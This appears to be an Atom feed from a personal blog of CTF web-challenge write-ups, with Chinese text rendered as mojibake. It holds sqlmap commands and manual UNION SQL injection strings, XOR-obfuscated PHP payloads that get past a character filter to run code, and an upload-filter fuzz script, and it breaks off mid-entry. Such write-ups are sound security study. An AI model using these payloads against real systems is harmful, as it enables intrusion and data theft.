<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>inanb</title>
  
  <subtitle>æ˜¨å¤œé›¨ç–é£éª¤ æµ“ç¡ä¸æ¶ˆæ®‹é…’</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-03T10:37:07.834Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>inanb</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>b01lers2020-Life_on_Mars</title>
    <link href="http://example.com/2021/09/03/b01lers2020-Life_on_Mars/"/>
    <id>http://example.com/2021/09/03/b01lers2020-Life_on_Mars/</id>
    <published>2021-09-03T09:42:32.238Z</published>
    <updated>2021-09-03T10:37:07.834Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>sqlmapä½¿ç”¨ç»ƒä¹ </p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#sqlmap">sqlmap</a></li><li><a href="#%E6%89%8B%E5%B7%A5">æ‰‹å·¥</a></li></ul><!-- tocstop --></div><br><blockquote><p>ä¸ºäº†å¿«é€Ÿæ¢æµ‹æ¼æ´ï¼Œè‡ªåŠ¨åŒ–æ‰«æå¾ˆé‡è¦ï¼Œä¸“é—¨æ¥ç»ƒä¹ sqlmap</p></blockquote><h4><span id="sqlmap">sqlmap</span></h4><img src="/images/b01lers2020-Life_on_Mars/image-20210903174505885.png" alt="image-20210903174505885" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http:&#x2F;&#x2F;0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81&#x2F;query?search&#x3D;chryse_planitia</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903174656965.png" alt="image-20210903174656965" style="zoom:80%;"><p>è”åˆæŸ¥è¯¢â€¦â€¦</p><p>è·å¾—åº“åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http:&#x2F;&#x2F;0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81&#x2F;query?search&#x3D;chryse_planitia --dbs</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903174917424.png" alt="image-20210903174917424" style="zoom:80%;"><p>è·å¾—è¡¨åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http:&#x2F;&#x2F;0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81&#x2F;query?search&#x3D;chryse_planitia --tables -D alien_code</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903175030391.png" alt="image-20210903175030391" style="zoom:80%;">.</p><p>è·å¾—å­—æ®µåï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http://0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81/query?search=chryse_planitia --columns -D alien_code -T code</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903175142744.png" alt="image-20210903175142744" style="zoom:80%;"><p>è·å–å­—æ®µå†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http://0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81/query?search=chryse_planitia --dump -D alien_code -T code -C code</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903175252109.png" alt="image-20210903175252109" style="zoom:80%;"><p>è·å¾—flagï¼</p><h4><span id="æ‰‹å·¥">æ‰‹å·¥</span></h4><p>è·å–åº“åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(group_concat(schema_name))from(information_schema.schemata))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903182412381.png" alt="image-20210903182412381"></p><p>è·å–è¡¨åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;alien_code&#39;))from(information_schema.schemata))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903182623802.png" alt="image-20210903182623802"></p><p>è·å–å­—æ®µåï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;code&#39;))from(information_schema.schemata))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903183329390.png" alt="image-20210903183329390"></p><p>flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(select(code)from(alien_code.code)))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903183648548.png" alt="image-20210903183648548"></p><p>wuhu~</p><p>å‚è€ƒæ–‡ç« :<br><a href="https://www.jianshu.com/p/5b4eac2e071d">sqlmapå¸¸ç”¨å‘½ä»¤åŠç”¨æ³•</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;sqlmapä½¿ç”¨ç»ƒä¹ &lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>ISITDTU-2019-EasyPHP</title>
    <link href="http://example.com/2021/09/03/ISITDTU-2019-EasyPHP/"/>
    <id>http://example.com/2021/09/03/ISITDTU-2019-EasyPHP/</id>
    <published>2021-09-03T03:15:58.421Z</published>
    <updated>2021-09-03T04:08:29.293Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>å–åã€å¼‚æˆ–ã€bypassã€rce</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E6%BA%90%E7%A0%81">æºç </a></li><li><a href="#%E7%BB%95%E8%BF%87">ç»•è¿‡</a></li></ul><!-- tocstop --></div><br><h4><span id="æºç ">æºç </span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosÃ© will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>\x00- 0-9                       åŒ¹é…\x00åˆ°ç©ºæ ¼(\x20)ï¼Œ0-9çš„æ•°å­—<br>â€˜â€œ`$&amp;.,|[{_defgops              åŒ¹é…è¿™äº›å­—ç¬¦<br>\x7F                            åŒ¹é…DEL(\x7F)å­—ç¬¦</p></blockquote><p>åŒæ—¶è¦æ±‚ä½¿ç”¨çš„ç¬¦å·ä¸å¾—è¶…è¿‡16</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ok = [];</span><br><span class="line">$s  = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">$match = <span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    $char = chr($i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match($match, $char))&#123;</span><br><span class="line">        $ok[$i] = $char;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($ok);</span><br></pre></td></tr></table></figure><p>æŸ¥å¯ç”¨çš„å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$array=get_defined_functions();<span class="comment">//è¿”å›æ‰€æœ‰å†…ç½®å®šä¹‰å‡½æ•°</span></span><br><span class="line">$match = <span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match($match, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.PHP_EOL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ç›´æ¥ä½¿ç”¨çš„å‡½æ•°</p><p>å¾ˆå°‘ï¼Œè¿˜æ˜¯è¦æ ¹æ®å–åçš„æ€è·¯æ¥æ„é€ ã€‚æ²¡æœ‰é™åˆ¶å­—ç¬¦ä¸²æ€»é•¿åº¦ï¼Œå¯ä»¥è‚†æ„æ„é€ </p><h4><span id="ç»•è¿‡">ç»•è¿‡</span></h4><p>æ¥ä¸‹æ¥ç»•è¿‡å­—ç¬¦æ•°</p><p>é™¤å»<code>() ; ^ %ff</code>ï¼Œå¯ç”¨å­—ç¬¦åªæœ‰9ç§</p><p>æ¯”å¦‚æˆ‘ä»¬æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D)^(%FF%FF%FF%FF%FF%FF%FF))(((%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D)^(%FF%FF%FF%FF%FF%FF%FF))((%D1)^(%FF)));</span><br><span class="line"><span class="comment">//print_r(scandir(.))</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ä½¿ç”¨å­—ç¬¦æœ‰16ç§ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡åå¤å¼‚æˆ–æ¥ç”¨å…¶ä»–å­—ç¬¦è¡¨ç¤ºè¿™ä¸‰ä¸ªå­—ç¬¦ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆ: a^a^a &#x3D; a</span><br><span class="line">è‹¥: c^d^i &#x3D; n</span><br><span class="line">åˆ™: ~n &#x3D; ~c^d^i &#x3D;&gt; n^0xff &#x3D; c^d^i^0xff</span><br><span class="line">å…¶ä»–å­—ç¬¦: a^a^a^0xff &#x3D; a^0xff &#x3D; a^0xff^0xff^0xff</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬æŒ‡å®šè§„åˆ™ï¼Œå¯¹è¦æ›¿æ¢çš„å­—ç¬¦æ‰¾ä¸‰ä¸ªå¼‚æˆ–å­—ç¬¦ä¸²(<em>ä¸å½±å“å…¶ä»–å­—ç¬¦</em>)ï¼Œåå†æ„é€ ä¸€æ¬¡å¼‚æˆ–ï¼Œå°±å¯ä»¥æ›¿æ¢æŒ‡å®šå­—ç¬¦ã€‚</p><p>è§„åˆ™è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;scdeafle&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;nir&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(a)^<span class="built_in">ord</span>(b)^<span class="built_in">ord</span>(c) == <span class="built_in">ord</span>(m):</span><br><span class="line">                    print(<span class="string">&quot;&#123;&#125; = &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;</span>.<span class="built_in">format</span>(m, a, b, c), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    print(<span class="string">&quot; ---&gt; &quot;</span>+<span class="string">&quot;%&#123;:x&#125; = %&#123;:x&#125; ^ %&#123;:x&#125; ^ %&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(m)^<span class="number">255</span>, <span class="built_in">ord</span>(a)^<span class="number">255</span>, <span class="built_in">ord</span>(b)^<span class="number">255</span>, <span class="built_in">ord</span>(c)^<span class="number">255</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    print(<span class="string">&quot; ===&gt; &quot;</span>+<span class="string">&quot;&#x27;&#123;&#125;&#x27;,[&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;]&quot;</span>.<span class="built_in">format</span>(m,a,b,c))</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/images/ISITDTU-2019-EasyPHP/image-20210903114357978.png" alt="image-20210903114357978" style="zoom:80%;"><p>å­—ç¬¦ä¸²ç”Ÿæˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//@inanb</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rep</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $t;</span><br><span class="line">    <span class="keyword">public</span> $e1;</span><br><span class="line">    <span class="keyword">public</span> $e2;</span><br><span class="line">    <span class="keyword">public</span> $e3;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$target,$arry</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;t = $target;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e1 = $arry[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e2 = $arry[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e3 = $arry[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fullescape</span>(<span class="params">$in</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $out = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($in);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $hex = dechex(ord($in[$i]));</span><br><span class="line">        <span class="keyword">if</span> ($hex==<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            $out = $out.urlencode($in[$i]);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $out = $out .<span class="string">&#x27;%&#x27;</span>.((strlen($hex)==<span class="number">1</span>) ? (<span class="string">&#x27;0&#x27;</span>.strtoupper($hex)):(strtoupper($hex)));</span><br><span class="line">    &#125;</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%20&#x27;</span>,$out);</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;%5F&#x27;</span>,$out);</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;%2E&#x27;</span>,$out);</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;%2D&#x27;</span>,$out);</span><br><span class="line">    <span class="keyword">return</span> $out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = <span class="string">&quot;scandir&quot;</span>; $len = strlen($str); $str1 = $str2 = $str3 = $str;</span><br><span class="line">$xor = str_repeat(<span class="string">&quot;%ff&quot;</span>, $len);</span><br><span class="line"></span><br><span class="line">$mode1 = <span class="keyword">new</span> rep(<span class="string">&#x27;n&#x27;</span>,[<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;l&#x27;</span>]);</span><br><span class="line">$mode2 = <span class="keyword">new</span> rep(<span class="string">&quot;i&quot;</span>,[<span class="string">&quot;c&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;l&quot;</span>]);</span><br><span class="line">$mode3 = <span class="keyword">new</span> rep(<span class="string">&quot;r&quot;</span>,[<span class="string">&quot;s&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>]);</span><br><span class="line"></span><br><span class="line">$str1 = str_replace($mode1-&gt;t,$mode1-&gt;e1,$str1);$str2 = str_replace($mode1-&gt;t,$mode1-&gt;e2,$str2);$str3 = str_replace($mode1-&gt;t,$mode1-&gt;e3,$str3);</span><br><span class="line">$str1 = str_replace($mode2-&gt;t,$mode2-&gt;e1,$str1);$str2 = str_replace($mode2-&gt;t,$mode2-&gt;e2,$str2);$str3 = str_replace($mode2-&gt;t,$mode2-&gt;e3,$str3);</span><br><span class="line">$str1 = str_replace($mode3-&gt;t,$mode3-&gt;e1,$str1);$str2 = str_replace($mode3-&gt;t,$mode3-&gt;e2,$str2);$str3 = str_replace($mode3-&gt;t,$mode3-&gt;e3,$str3);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;((&#x27;</span>.fullescape(~$str1).<span class="string">&#x27;)^(&#x27;</span>.fullescape(~$str2).<span class="string">&#x27;)^(&#x27;</span>.fullescape(~$str3).<span class="string">&#x27;)^(&#x27;</span>.$xor.<span class="string">&#x27;))&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>å†™å¾—æœ‰ç‚¹ç²—ç³™ğŸ¤£ï¼Œæ·»åŠ è§„åˆ™éœ€è¦åŠ modeï¼Œå¹¶å¯¹ä¸‰ä¸ªå­—ä¸²å†å¤„ç†ä¸€ä¸‹</p></blockquote><p>ç›®å½•ä¸‹æœ‰ä¸€ä¸ªflagæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//readfile(end(scandir(.))) endè¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">((%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">9</span>C%<span class="number">93</span>%<span class="number">9</span>A)^(%<span class="number">9</span>B%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>A)^(%<span class="number">9</span>A%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">9</span>A)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">9</span>A%<span class="number">9</span>C%<span class="number">9</span>B)^(%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B)^(%<span class="number">9</span>A%<span class="number">93</span>%<span class="number">9</span>B)^(%ff%ff%ff))(((%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">9</span>B%<span class="number">9</span>C%<span class="number">8</span>C)^(%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">9</span>B)^(%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">93</span>%<span class="number">9</span>B%<span class="number">93</span>%<span class="number">9</span>A)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure><img src="/images/ISITDTU-2019-EasyPHP/image-20210903115014297.png" alt="image-20210903115014297" style="zoom:80%;"><p>å‚è€ƒæ–‡ç« :<br><a href="%5Bhttps://blog.csdn.net/fmyyy1/article/details/116171155?utm_term=2019%5DEasyPHP%5BISITDTU&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-116171155&spm=3001.4430%5D(https://blog.csdn.net/fmyyy1/article/details/116171155?utm_term=2019%5DEasyPHP%5BISITDTU&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-116171155&spm=3001.4430)">å‚è€ƒé“¾æ¥</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;å–åã€å¼‚æˆ–ã€bypassã€rce&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF-2018-GetShell</title>
    <link href="http://example.com/2021/08/31/SUCTF-2018-GetShell/"/>
    <id>http://example.com/2021/08/31/SUCTF-2018-GetShell/</id>
    <published>2021-08-31T12:37:17.632Z</published>
    <updated>2021-08-31T13:06:58.431Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>ç¥å¥‡çš„ç»•è¿‡rce</p><a id="more"></a></blockquote><h4><span id="æºç ">æºç </span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ æ£€æµ‹â€¦â€¦</p><p>fuzzè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii_str</span>():</span></span><br><span class="line">    str_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        str_list.append(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="comment"># print(&#x27;å¯æ˜¾ç¤ºå­—ç¬¦ï¼š%s&#x27;%str_list)</span></span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_list = ascii_str()</span><br><span class="line">url = <span class="string">&quot;http://30aab2f9-a474-461d-82c0-3306918ca114.node4.buuoj.cn:81/index.php?act=upload&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fuzz <span class="keyword">in</span> str_list:</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&quot;12345&quot;</span> + fuzz, <span class="string">&#x27;application/text&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=url, headers=headers, files=files)</span><br><span class="line">    res = response.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Stored&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">        print(<span class="string">&quot;è¯¥å­—ç¬¦å¯ä»¥é€šè¿‡:  &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(fuzz))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;è¿‡æ»¤å­—ç¬¦:  &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(fuzz))</span><br></pre></td></tr></table></figure><p><img src="/images/SUCTF-2018-GetShell/image-20210831210425130.png" alt="image-20210831210425130"></p><p>è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦</p><h4><span 